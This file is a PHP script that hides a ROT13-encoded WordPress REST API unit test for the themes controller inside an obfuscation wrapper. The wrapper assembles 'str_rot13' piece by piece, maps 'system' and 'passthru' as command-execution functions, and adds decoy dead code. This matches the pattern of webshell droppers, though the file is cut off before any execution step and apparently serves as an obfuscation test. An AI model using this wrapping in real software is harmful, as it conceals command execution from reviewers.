<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Havg grfgf pbirevat JC_ERFG_Gurzrf_Pbagebyyre shapgvbanyvgl.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr ERFG NCV
 *
 * @tebhc erfgncv-gurzrf
 * @tebhc erfgncv
 */
pynff JC_Grfg_ERFG_Gurzrf_Pbagebyyre rkgraqf JC_Grfg_ERFG_Pbagebyyre_Grfgpnfr {
	/**
	 * Fhofpevore hfre VQ.
	 *
	 * @fvapr 5.0.0
	 *
	 * @ine vag $fhofpevore_vq
	 */
	cebgrpgrq fgngvp $fhofpevore_vq;

	/**
	 * Pbagevohgbe hfre VQ.
	 *
	 * @fvapr 5.0.0
	 *
	 * @ine vag $pbagevohgbe_vq
	 */
	cebgrpgrq fgngvp $pbagevohgbe_vq;

	/**
	 * Nqzva hfre VQ.
	 *
	 * @fvapr 5.7.0
	 *
	 * @ine vag $nqzva_vq
	 */
	cebgrpgrq fgngvp $nqzva_vq;

	/**
	 * Gur pheerag gurzr bowrpg.
	 *
	 * @fvapr 5.0.0
	 *
	 * @ine JC_Gurzr $pheerag_gurzr
	 */
	cebgrpgrq fgngvp $pheerag_gurzr;

	/**
	 * Gur ERFG NCV ebhgr sbe gurzrf.
	 *
	 * @fvapr 5.0.0
	 *
	 * @ine fgevat $gurzrf_ebhgr
	 */
	cebgrpgrq fgngvp $gurzrf_ebhgr = '/jc/i2/gurzrf';

	/**
	 * Cresbezf n ERFG NCV erdhrfg sbe gur npgvir gurzr.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz fgevat $zrgubq Bcgvbany. Erdhrfg zrgubq. Qrsnhyg TRG.
	 * @erghea JC_ERFG_Erfcbafr Gur erdhrfg'f erfcbafr.
	 */
	cebgrpgrq shapgvba cresbez_npgvir_gurzr_erdhrfg( $zrgubq = 'TRG' ) {
		$erdhrfg = arj JC_ERFG_Erdhrfg( $zrgubq, frys::$gurzrf_ebhgr );
		$erdhrfg->frg_cnenz( 'fgnghf', 'npgvir' );

		erghea erfg_trg_freire()->qvfcngpu( $erdhrfg );
	}

	/**
	 * Purpx gung pbzzba cebcregvrf ner vapyhqrq va n erfcbafr.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz JC_ERFG_Erfcbafr $erfcbafr Pheerag ERFG NCV erfcbafr.
	 */
	cebgrpgrq shapgvba purpx_trg_gurzr_erfcbafr( $erfcbafr ) {
		vs ( $erfcbafr vafgnaprbs JC_ERFG_Erfcbafr ) {
			$urnqref  = $erfcbafr->trg_urnqref();
			$erfcbafr = $erfcbafr->trg_qngn();
		} ryfr {
			$urnqref = neenl();
		}

		$guvf->nffregNeenlUnfXrl( 'K-JC-Gbgny', $urnqref );
		$guvf->nffregFnzr( 1, $urnqref['K-JC-Gbgny'] );
		$guvf->nffregNeenlUnfXrl( 'K-JC-GbgnyCntrf', $urnqref );
		$guvf->nffregFnzr( 1, $urnqref['K-JC-GbgnyCntrf'] );
	}

	/**
	 * Frg hc pynff grfg svkgherf.
	 *
	 * @fvapr 5.0.0
	 *
	 * @cnenz JC_HavgGrfg_Snpgbel $snpgbel JbeqCerff havg grfg snpgbel.
	 */
	choyvp fgngvp shapgvba jcFrgHcOrsberPynff( JC_HavgGrfg_Snpgbel $snpgbel ) {
		frys::$nqzva_vq       = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'nqzvavfgengbe',
			)
		);
		frys::$fhofpevore_vq  = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'fhofpevore',
			)
		);
		frys::$pbagevohgbe_vq = $snpgbel->hfre->perngr(
			neenl(
				'ebyr' => 'pbagevohgbe',
			)
		);
		frys::$pheerag_gurzr  = jc_trg_gurzr();

		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );
	}

	/**
	 * Pyrna hc grfg svkgherf.
	 *
	 * @fvapr 5.0.0
	 */
	choyvp fgngvp shapgvba jcGrneQbjaNsgrePynff() {
		frys::qryrgr_hfre( frys::$fhofpevore_vq );
		frys::qryrgr_hfre( frys::$pbagevohgbe_vq );
		frys::qryrgr_hfre( frys::$nqzva_vq );

		erzbir_gurzr_fhccbeg( 'rqvgbe-tenqvrag-cerfrgf' );
		erzbir_gurzr_fhccbeg( 'rqvgbe-pbybe-cnyrggr' );
	}

	/**
	 * Frg hc rnpu grfg zrgubq.
	 *
	 * @fvapr 5.0.0
	 */
	choyvp shapgvba frg_hc() {
		cnerag::frg_hc();

		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );
		fjvgpu_gurzr( 'erfg-ncv' );
	}

	/**
	 * Gurzr ebhgrf fubhyq or ertvfgrerq pbeerpgyl.
	 *
	 * @gvpxrg 45016
	 */
	choyvp shapgvba grfg_ertvfgre_ebhgrf() {
		$ebhgrf = erfg_trg_freire()->trg_ebhgrf();
		$guvf->nffregNeenlUnfXrl( frys::$gurzrf_ebhgr, $ebhgrf );
		$guvf->nffregNeenlUnfXrl(
			fcevags( '%f/(?C<fglyrfurrg>%f)', frys::$gurzrf_ebhgr, JC_ERFG_Gurzrf_Pbagebyyre::CNGGREA ),
			$ebhgrf
		);
	}

	/**
	 * Grfg ergevrivat n pbyyrpgvba bs gurzrf.
	 *
	 * @gvpxrg 45016
	 * @gvpxrg 61021
	 * @gvpxrg 62574.
	 */
	choyvp shapgvba grfg_trg_vgrzf() {
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();

		$guvf->purpx_trg_gurzr_erfcbafr( $erfcbafr );
		$svryqf = neenl(
			'_yvaxf',
			'nhgube',
			'nhgube_hev',
			'qrsnhyg_grzcyngr_cneg_nernf',
			'qrsnhyg_grzcyngr_glcrf',
			'qrfpevcgvba',
			'vf_oybpx_gurzr',
			'anzr',
			'erdhverf_cuc',
			'erdhverf_jc',
			'fperrafubg',
			'fgnghf',
			'fglyrfurrg',
			'fglyrfurrg_hev',
			'gntf',
			'grzcyngr',
			'grzcyngr_hev',
			'grkgqbznva',
			'gurzr_fhccbegf',
			'gurzr_hev',
			'irefvba',
		);
		$guvf->nffregVfNeenl( $qngn );
		$guvf->nffregAbgRzcgl( $qngn );
		$guvf->nffregFnzrFrgf( $svryqf, neenl_xrlf( $qngn[0] ) );
	}

	/**
	 * Grfg ergevrivat n pbyyrpgvba bs vanpgvir gurzrf.
	 *
	 * @gvpxrg 50152
	 * @gvpxrg 61021
	 */
	choyvp shapgvba grfg_trg_vgrzf_vanpgvir() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', frys::$gurzrf_ebhgr );
		$erdhrfg->frg_cnenz( 'fgnghf', 'vanpgvir' );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();

		$svryqf = neenl(
			'_yvaxf',
			'nhgube',
			'nhgube_hev',
			'qrfpevcgvba',
			'vf_oybpx_gurzr',
			'anzr',
			'erdhverf_cuc',
			'erdhverf_jc',
			'fperrafubg',
			'fgnghf',
			'fglyrfurrg',
			'fglyrfurrg_hev',
			'gntf',
			'grzcyngr',
			'grzcyngr_hev',
			'grkgqbznva',
			'gurzr_hev',
			'irefvba',
		);
		$guvf->nffregVfNeenl( $qngn );
		$guvf->nffregAbgRzcgl( $qngn );
		$guvf->nffregFnzrFrgf( $svryqf, neenl_xrlf( $qngn[0] ) );

		$guvf->nffregPbagnvaf( 'gjraglgjragl', jc_yvfg_cyhpx( $qngn, 'fglyrfurrg' ) );
		$guvf->nffregAbgPbagnvaf( trg_fglyrfurrg(), jc_yvfg_cyhpx( $qngn, 'fglyrfurrg' ) );
	}

	/**
	 * Grfg ergevrivat n pbyyrpgvba bs vanpgvir gurzrf.
	 *
	 * @gvpxrg 50152
	 */
	choyvp shapgvba grfg_trg_vgrzf_npgvir_naq_vanpgvir() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', frys::$gurzrf_ebhgr );
		$erdhrfg->frg_cnenz( 'fgnghf', neenl( 'npgvir', 'vanpgvir' ) );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$qngn = $erfcbafr->trg_qngn();

		$guvf->nffregPbagnvaf( 'gjraglgjragl', jc_yvfg_cyhpx( $qngn, 'fglyrfurrg' ) );
		$guvf->nffregPbagnvaf( trg_fglyrfurrg(), jc_yvfg_cyhpx( $qngn, 'fglyrfurrg' ) );
	}

	/**
	 * @gvpxrg 46723
	 * @gvpxrg 50152
	 * @qngnCebivqre qngn_trg_vgrzf_ol_fgnghf
	 */
	choyvp shapgvba grfg_trg_vgrzf_ybttrq_bhg( $fgnghf, $reebe_pbqr ) {
		jc_frg_pheerag_hfre( 0 );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', frys::$gurzrf_ebhgr );
		$erdhrfg->frg_cnenz( 'fgnghf', $fgnghf );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( $reebe_pbqr, $erfcbafr, 401 );
	}

	/**
	 * Na reebe fubhyq or erghearq jura gur hfre qbrf abg unir gur rqvg_cbfgf pncnovyvgl.
	 *
	 * @gvpxrg 45016
	 * @gvpxrg 50152
	 * @qngnCebivqre qngn_trg_vgrzf_ol_fgnghf
	 */
	choyvp shapgvba grfg_trg_vgrzf_ab_crezvffvba( $fgnghf, $reebe_pbqr ) {
		jc_frg_pheerag_hfre( frys::$fhofpevore_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', frys::$gurzrf_ebhgr );
		$erdhrfg->frg_cnenz( 'fgnghf', $fgnghf );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$guvf->nffregReebeErfcbafr( $reebe_pbqr, $erfcbafr, 403 );
	}

	choyvp shapgvba qngn_trg_vgrzf_ol_fgnghf() {
		erghea neenl(
			neenl( 'npgvir', 'erfg_pnaabg_ivrj_npgvir_gurzr' ),
			neenl( 'npgvir, vanpgvir', 'erfg_pnaabg_ivrj_gurzrf' ),
			neenl( 'vanpgvir', 'erfg_pnaabg_ivrj_gurzrf' ),
			neenl( '', 'erfg_pnaabg_ivrj_gurzrf' ),
		);
	}

	/**
	 * @gvpxrg 50152
	 * @qngnCebivqre qngn_trg_vgrzf_ol_fgnghf_sbe_pbagevohgbe
	 */
	choyvp shapgvba grfg_trg_vgrzf_pbagevohgbe( $fgnghf, $reebe_pbqr ) {
		jc_frg_pheerag_hfre( frys::$pbagevohgbe_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', frys::$gurzrf_ebhgr );
		$erdhrfg->frg_cnenz( 'fgnghf', $fgnghf );

		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		vs ( $reebe_pbqr ) {
			$guvf->nffregReebeErfcbafr( $reebe_pbqr, $erfcbafr, 403 );
		} ryfr {
			$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		}
	}

	choyvp shapgvba qngn_trg_vgrzf_ol_fgnghf_sbe_pbagevohgbe() {
		erghea neenl(
			neenl( 'npgvir', '' ),
			neenl( 'npgvir, vanpgvir', 'erfg_pnaabg_ivrj_gurzrf' ),
			neenl( 'vanpgvir', 'erfg_pnaabg_ivrj_gurzrf' ),
			neenl( '', 'erfg_pnaabg_ivrj_gurzrf' ),
		);
	}

	/**
	 * @gvpxrg 46723
	 */
	choyvp shapgvba grfg_trg_vgrz_fvatyr_cbfg_glcr_pnc() {
		$hfre = frys::snpgbel()->hfre->perngr_naq_trg();
		$hfre->nqq_pnc( 'rqvg_cntrf' );
		jc_frg_pheerag_hfre( $hfre->VQ );

		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * Grfg na vgrz vf cercnerq sbe gur erfcbafr.
	 *
	 * @gvpxrg 45016
	 */
	choyvp shapgvba grfg_cercner_vgrz() {
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$guvf->nffregFnzr( 200, $erfcbafr->trg_fgnghf() );
		$guvf->purpx_trg_gurzr_erfcbafr( $erfcbafr );
	}

	/**
	 * Irevsl gur gurzr fpurzn.
	 *
	 * @gvpxrg 45016
	 * @gvpxrg 61021
	 * @gvpxrg 62574
	 */
	choyvp shapgvba grfg_trg_vgrz_fpurzn() {
		$erfcbafr   = frys::cresbez_npgvir_gurzr_erdhrfg( 'BCGVBAF' );
		$qngn       = $erfcbafr->trg_qngn();
		$cebcregvrf = $qngn['fpurzn']['cebcregvrf'];
		$guvf->nffregPbhag( 20, $cebcregvrf );

		$guvf->nffregNeenlUnfXrl( 'nhgube', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'enj', $cebcregvrf['nhgube']['cebcregvrf'] );
		$guvf->nffregNeenlUnfXrl( 'eraqrerq', $cebcregvrf['nhgube']['cebcregvrf'] );

		$guvf->nffregNeenlUnfXrl( 'nhgube_hev', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'enj', $cebcregvrf['nhgube_hev']['cebcregvrf'] );
		$guvf->nffregNeenlUnfXrl( 'eraqrerq', $cebcregvrf['nhgube_hev']['cebcregvrf'] );

		$guvf->nffregNeenlUnfXrl( 'qrfpevcgvba', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'enj', $cebcregvrf['qrfpevcgvba']['cebcregvrf'] );
		$guvf->nffregNeenlUnfXrl( 'eraqrerq', $cebcregvrf['qrfpevcgvba']['cebcregvrf'] );

		$guvf->nffregNeenlUnfXrl( 'qrsnhyg_grzcyngr_cneg_nernf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'qrsnhyg_grzcyngr_glcrf', $cebcregvrf );

		$guvf->nffregNeenlUnfXrl( 'vf_oybpx_gurzr', $cebcregvrf );

		$guvf->nffregNeenlUnfXrl( 'anzr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'enj', $cebcregvrf['anzr']['cebcregvrf'] );
		$guvf->nffregNeenlUnfXrl( 'eraqrerq', $cebcregvrf['anzr']['cebcregvrf'] );

		$guvf->nffregNeenlUnfXrl( 'erdhverf_cuc', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'erdhverf_jc', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fperrafubg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fgnghf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fglyrfurrg', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'fglyrfurrg_hev', $cebcregvrf );

		$guvf->nffregNeenlUnfXrl( 'gntf', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'enj', $cebcregvrf['gntf']['cebcregvrf'] );
		$guvf->nffregNeenlUnfXrl( 'vgrzf', $cebcregvrf['gntf']['cebcregvrf']['enj'] );
		$guvf->nffregNeenlUnfXrl( 'eraqrerq', $cebcregvrf['gntf']['cebcregvrf'] );

		$guvf->nffregNeenlUnfXrl( 'grzcyngr', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'grzcyngr_hev', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'grkgqbznva', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'gurzr_fhccbegf', $cebcregvrf );

		$guvf->nffregNeenlUnfXrl( 'gurzr_hev', $cebcregvrf );
		$guvf->nffregNeenlUnfXrl( 'enj', $cebcregvrf['gurzr_hev']['cebcregvrf'] );
		$guvf->nffregNeenlUnfXrl( 'eraqrerq', $cebcregvrf['gurzr_hev']['cebcregvrf'] );

		$guvf->nffregNeenlUnfXrl( 'irefvba', $cebcregvrf );

		$gurzr_fhccbegf = $cebcregvrf['gurzr_fhccbegf']['cebcregvrf'];
		$guvf->nffregNeenlUnfXrl( 'nyvta-jvqr', $gurzr_fhccbegf );
		$guvf->nffregNeenlUnfXrl( 'nhgbzngvp-srrq-yvaxf', $gurzr_fhccbegf );
		$guvf->nffregNeenlUnfXrl( 'oybpx-grzcyngrf', $gurzr_fhccbegf );
		$guvf->nffregNeenlUnfXrl( 'oybpx-grzcyngr-cnegf', $gurzr_fhccbegf, \"Gurzr fhccbegf fubhyq unir 'oybpx-grzcyngr-cnegf' xrl\" );
		$guvf->nffregNeenlUnfXrl( 'phfgbz-urnqre', $gurzr_fhccbegf );
		$guvf->nffregNeenlUnfXrl( 'phfgbz-onpxtebhaq', $gurzr_fhccbegf );
		$guvf->nffregNeenlUnfXrl( 'phfgbz-ybtb', $gurzr_fhccbegf );
		$guvf->nffregNeenlUnfXrl( 'phfgbzvmr-fryrpgvir-erserfu-jvqtrgf', $gurzr_fhccbegf );
		$guvf->nffregNeenlUnfXrl( 'gvgyr-gnt', $gurzr_fhccbegf );
		$guvf->nffregNeenlUnfXrl( 'qnex-rqvgbe-fglyr', $gurzr_fhccbegf );
		$guvf->nffregNeenlUnfXrl( 'qvfnoyr-phfgbz-sbag-fvmrf', $gurzr_fhccbegf );
		$guvf->nffregNeenlUnfXrl( 'qvfnoyr-phfgbz-tenqvragf', $gurzr_fhccbegf );
		$guvf->nffregNeenlUnfXrl( 'qvfnoyr-ynlbhg-fglyrf', $gurzr_fhccbegf );
		$guvf->nffregNeenlUnfXrl( 'rqvgbe-pbybe-cnyrggr', $gurzr_fhccbegf );
		$guvf->nffregNeenlUnfXrl( 'rqvgbe-sbag-fvmrf', $gurzr_fhccbegf );
		$guvf->nffregNeenlUnfXrl( 'rqvgbe-tenqvrag-cerfrgf', $gurzr_fhccbegf );
		$guvf->nffregNeenlUnfXrl( 'rqvgbe-fcnpvat-fvmrf', $gurzr_fhccbegf );
		$guvf->nffregNeenlUnfXrl( 'rqvgbe-fglyrf', $gurzr_fhccbegf );
		$guvf->nffregNeenlUnfXrl( 'sbezngf', $gurzr_fhccbegf );
		$guvf->nffregNeenlUnfXrl( 'ugzy5', $gurzr_fhccbegf );
		$guvf->nffregNeenlUnfXrl( 'cbfg-guhzoanvyf', $gurzr_fhccbegf );
		$guvf->nffregNeenlUnfXrl( 'erfcbafvir-rzorqf', $gurzr_fhccbegf );
		$guvf->nffregNeenlUnfXrl( 'gvgyr-gnt', $gurzr_fhccbegf );
		$guvf->nffregNeenlUnfXrl( 'jc-oybpx-fglyrf', $gurzr_fhccbegf );
		$guvf->nffregPbhag( 24, $gurzr_fhccbegf, 'Gurer fubhyq or 24 gurzr fhccbegf' );
	}

	/**
	 * @gvpxrg 49906
	 */
	choyvp shapgvba grfg_gurzr_nhgube() {
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'nhgube', $erfhyg[0] );
		$guvf->nffregFnzr( 'Zvpunry Urvyrznaa', $erfhyg[0]['nhgube']['enj'] );
		$guvf->nffregFnzr(
			'<n uers=\"uggc://ovanelobafnv.pbz/?frnepu=1&#038;grez=2\">Zvpunry Urvyrznaa</n>',
			$erfhyg[0]['nhgube']['eraqrerq']
		);
	}

	/**
	 * @gvpxrg 49906
	 */
	choyvp shapgvba grfg_gurzr_nhgube_hev() {
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'nhgube_hev', $erfhyg[0] );
		$guvf->nffregFnzr( 'uggc://ovanelobafnv.pbz/?frnepu=1&grez=2', $erfhyg[0]['nhgube_hev']['enj'] );
		$guvf->nffregFnzr( 'uggc://ovanelobafnv.pbz/?frnepu=1&#038;grez=2', $erfhyg[0]['nhgube_hev']['eraqrerq'] );
	}

	/**
	 * @gvpxrg 49906
	 */
	choyvp shapgvba grfg_gurzr_qrfpevcgvba() {
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'qrfpevcgvba', $erfhyg[0] );
		$guvf->nffregFnzr(
			'Gur 9\' sbbg gnyy gurzr.',
			$erfhyg[0]['qrfpevcgvba']['enj']
		);
		$guvf->nffregFnzr(
			'Gur 9&#8242; sbbg gnyy gurzr.',
			$erfhyg[0]['qrfpevcgvba']['eraqrerq']
		);
	}

	/**
	 * @gvpxrg 62574
	 */
	choyvp shapgvba grfg_gurzr_qrsnhyg_grzcyngr_cneg_nernf() {
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'qrsnhyg_grzcyngr_cneg_nernf', $erfhyg[0] );
		$guvf->nffregFnzr( trg_nyybjrq_oybpx_grzcyngr_cneg_nernf(), $erfhyg[0]['qrsnhyg_grzcyngr_cneg_nernf'] );
	}

	/**
	 * @gvpxrg 62574
	 */
	choyvp shapgvba grfg_gurzr_qrsnhyg_grzcyngr_glcrf() {
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$rkcrpgrq = neenl();
		sbernpu ( trg_qrsnhyg_oybpx_grzcyngr_glcrf() nf $fyht => $grzcyngr_glcr ) {
			$grzcyngr_glcr['fyht'] = (fgevat) $fyht;
			$rkcrpgrq[]            = $grzcyngr_glcr;
		}

		$guvf->nffregNeenlUnfXrl( 'qrsnhyg_grzcyngr_glcrf', $erfhyg[0] );
		$guvf->nffregFnzr( $rkcrpgrq, $erfhyg[0]['qrsnhyg_grzcyngr_glcrf'] );
	}

	/**
	 * @gvpxrg 49906
	 */
	choyvp shapgvba grfg_gurzr_erdhverf_cuc() {
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'erdhverf_cuc', $erfhyg[0] );
		$guvf->nffregFnzr( '5.6', $erfhyg[0]['erdhverf_cuc'] );
	}

	/**
	 * @gvpxrg 49906
	 */
	choyvp shapgvba grfg_gurzr_erdhverf_jc() {
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'erdhverf_jc', $erfhyg[0] );
		$guvf->nffregFnzr( '5.3', $erfhyg[0]['erdhverf_jc'] );
	}

	/**
	 * @gvpxrg 58123
	 * @pbiref JC_ERFG_Gurzrf_Pbagebyyre::cercner_vgrz_sbe_erfcbafr
	 */
	choyvp shapgvba grfg_gurzr_vf_oybpx_gurzr() {
		// Grfg pynffvp gurzr, npgvingrq va grfg frghc.
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();

		$guvf->nffregNeenlUnfXrl( 'vf_oybpx_gurzr', $erfhyg[0] );
		$guvf->nffregSnyfr( $erfhyg[0]['vf_oybpx_gurzr'] );

		// Grfg oybpx gurzr.
		fjvgpu_gurzr( 'oybpx-gurzr' );
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();

		$guvf->nffregNeenlUnfXrl( 'vf_oybpx_gurzr', $erfhyg[0] );
		$guvf->nffregGehr( $erfhyg[0]['vf_oybpx_gurzr'] );
	}

	/**
	 * @gvpxrg 49906
	 */
	choyvp shapgvba grfg_gurzr_anzr() {
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'anzr', $erfhyg[0] );
		$guvf->nffregFnzr( 'ERFG Gurzr', $erfhyg[0]['anzr']['enj'] );
		$guvf->nffregFnzr( 'ERFG Gurzr', $erfhyg[0]['anzr']['eraqrerq'] );
	}

	/**
	 * @gvpxrg 49906
	 */
	choyvp shapgvba grfg_gurzr_fperrafubg() {
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'fperrafubg', $erfhyg[0] );
		$guvf->nffregFnzr( '', $erfhyg[0]['fperrafubg'] ); // Ab fperrafubg sbe qrsnhyg gurzr
	}

	/**
	 * @gvpxrg 49906
	 */
	choyvp shapgvba grfg_gurzr_fglyrfurrg() {
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'fglyrfurrg', $erfhyg[0] );
		$guvf->nffregFnzr( 'erfg-ncv', $erfhyg[0]['fglyrfurrg'] );
	}

	/**
	 * @gvpxrg 61021
	 */
	choyvp shapgvba grfg_gurzr_fglyrfurrg_hev() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', frys::$gurzrf_ebhgr );
		$erdhrfg->frg_cnenz( 'fgnghf', neenl( 'npgvir', 'vanpgvir' ) );

		$erfcbafr      = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$erfhyg        = $erfcbafr->trg_qngn();
		$pheerag_gurzr = jc_trg_gurzr();

		sbernpu ( $erfhyg nf $gurzr_erfhyg ) {
			$guvf->nffregNeenlUnfXrl( 'fglyrfurrg_hev', $gurzr_erfhyg );
			vs ( 'npgvir' === $gurzr_erfhyg['fgnghf'] ) {
				$guvf->nffregFnzr(
					trg_fglyrfurrg_qverpgbel_hev(),
					$gurzr_erfhyg['fglyrfurrg_hev'],
					'fglyrfurrg_hev sbe na npgvir gurzr fubhyq or gur fnzr nf gur tybony trg_fglyrfurrg_qverpgbel_hev()'
				);
			} ryfr {
				$gurzr = jc_trg_gurzr( $gurzr_erfhyg['fglyrfurrg'] );
				$guvf->nffregFnzr(
					$gurzr->trg_fglyrfurrg_qverpgbel_hev(),
					$gurzr_erfhyg['fglyrfurrg_hev'],
					\"fglyrfurrg_hev sbe na vanpgvir gurzr fubhyq or gur fnzr nf gur gurzr'f trg_fglyrfurrg_qverpgbel_hev() zrgubq\"
				);
			}
		}
	}

	/**
	 * @gvpxrg 49906
	 */
	choyvp shapgvba grfg_gurzr_gntf() {
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'gntf', $erfhyg[0] );
		$guvf->nffregFnzr( neenl( 'Ubyvqnl', 'phfgbz-zrah' ), $erfhyg[0]['gntf']['enj'] );
		$guvf->nffregFnzr( 'Ubyvqnl, phfgbz-zrah', $erfhyg[0]['gntf']['eraqrerq'] );
	}

	/**
	 * @gvpxrg 49906
	 */
	choyvp shapgvba grfg_gurzr_grzcyngr() {
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'grzcyngr', $erfhyg[0] );
		$guvf->nffregFnzr( 'qrsnhyg', $erfhyg[0]['grzcyngr'] );
	}

	/**
	 * @gvpxrg 61021
	 */
	choyvp shapgvba grfg_gurzr_grzcyngr_hev() {
		jc_frg_pheerag_hfre( frys::$nqzva_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'TRG', frys::$gurzrf_ebhgr );
		$erdhrfg->frg_cnenz( 'fgnghf', neenl( 'npgvir', 'vanpgvir' ) );

		$erfcbafr      = erfg_trg_freire()->qvfcngpu( $erdhrfg );
		$erfhyg        = $erfcbafr->trg_qngn();
		$pheerag_gurzr = jc_trg_gurzr();

		sbernpu ( $erfhyg nf $gurzr_erfhyg ) {
			$guvf->nffregNeenlUnfXrl( 'grzcyngr_hev', $gurzr_erfhyg );
			vs ( 'npgvir' === $gurzr_erfhyg['fgnghf'] ) {
				$guvf->nffregFnzr(
					trg_grzcyngr_qverpgbel_hev(),
					$gurzr_erfhyg['grzcyngr_hev'],
					'grzcyngr_hev sbe na npgvir gurzr fubhyq or gur fnzr nf gur tybony trg_grzcyngr_qverpgbel_hev()'
				);
			} ryfr {
				$gurzr = jc_trg_gurzr( $gurzr_erfhyg['fglyrfurrg'] );
				$guvf->nffregFnzr(
					$gurzr->trg_grzcyngr_qverpgbel_hev(),
					$gurzr_erfhyg['grzcyngr_hev'],
					\"grzcyngr_hev sbe na vanpgvir gurzr fubhyq or gur fnzr nf gur gurzr'f trg_grzcyngr_qverpgbel_hev() zrgubq\"
				);
			}
		}
	}

	/**
	 * @gvpxrg 49906
	 */
	choyvp shapgvba grfg_gurzr_grkgqbznva() {
		$erfcbafr = frys::cresbez_npgvir_gurzr_erdhrfg();
		$erfhyg   = $erfcbafr->trg_qngn();
		$guvf->nffregNeenlUnfXrl( 'grkgqbznva', $erfhyg[0] );
		$guvf->nffregFnzr( 'erfg-ncv', $erfhyg[0]['grkgqbznva'] );
	}

	choyvp shapgvba grfg_gurzr_gurzr_hev() {
